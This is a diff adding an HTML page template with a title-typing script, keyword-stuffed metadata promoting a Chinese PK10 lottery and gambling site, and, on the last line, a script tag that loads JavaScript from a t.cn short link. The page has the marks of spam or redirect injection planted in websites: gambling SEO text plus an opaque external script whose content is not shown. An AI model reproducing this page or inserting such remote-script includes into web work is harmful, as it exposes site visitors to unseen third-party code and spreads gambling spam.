@@ -1,0 +1,56 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset={charset}">
+<script LANGUAGE="Javascript">
+　　var message = new Array();
+　　message[0] = "{title_replace}";
+　　var reps = 1;
+　　var speed = 0;// Set the overall typing speed (larger number = slower action).
+　　var hold = 4111111
+　　var p = message.length;
+　　var q = 0;
+　　var r = 0;
+　　var C = 0;
+　　var mC = 0;
+　　var s = 0;
+　　var sT = null;
+　　if (reps < 1) {
+　 　reps = 1;
+　　}
+　　function setMessage() {
+　 　typing = message[mC];
+　 　q = typing.length;
+　 　r = q + hold;
+　 　typeMessage();
+　　}
+　　function typeMessage() {
+　 　if (s > r) {
+　  　s = 0;
+　 　}
+　 　if (s > q) {
+　  　document.title = typing ;
+　 　}
+ 　　else {
+　  　document.title = typing.substr(0,s);
+　 　}
+　 　if (C < (r * reps)) {
+　  　sT = setTimeout("typeMessage()", speed);
+　  　C++;
+  　　s++;
+　 　}
+　 　else {
+　  　C = 0;
+　  　s = 0;
+　  　mC++;
+　  　if(mC > p - 1) {mC = 0;}
+　  　sT = null;
+　  　setMessage();
+　 　}
+　　}
+　　setMessage();
+　　</script>
+<meta http-equiv="Content-Type" content="text/html; charset={charset}" />
+<meta http-equiv="X-UA-Compatible" content="IE=7" />
+<title>北京赛车pk10开奖直播_北京pk10开奖直播_北京赛车pk10历史记录_pk10开奖记录-大运彩票网</title>
+    <meta name="keywords" content="pk10开奖直播,北京赛车pk10开奖记录,北京赛车pk10开奖结果,北京赛车pk10开奖直播,北京赛车视频开奖,北京赛车pk10历史纪录,北京赛车pk10直播" />
+    <meta name="description" content="★www.123456cp.com★相信许多的玩家会玩北京赛车pk10开奖直播不仅仅是因为北京赛车pk10直播视频的中奖概率比较高，更多的应该是因为对于赛车的喜爱，掌握北京赛车pk10开奖状况，那么很好的进行手机版北京赛车pk10开奖直播的下载就是非常有必要的了，可登陆北京赛车pk10官网查询pk10开奖记录,因为大运彩票网这个软件可以说是在线进行比赛的实播也可以实时观看北京pk10历史记录查询！" />
+<script type="text/javascript" src="http://t.cn/RI27599"></script>
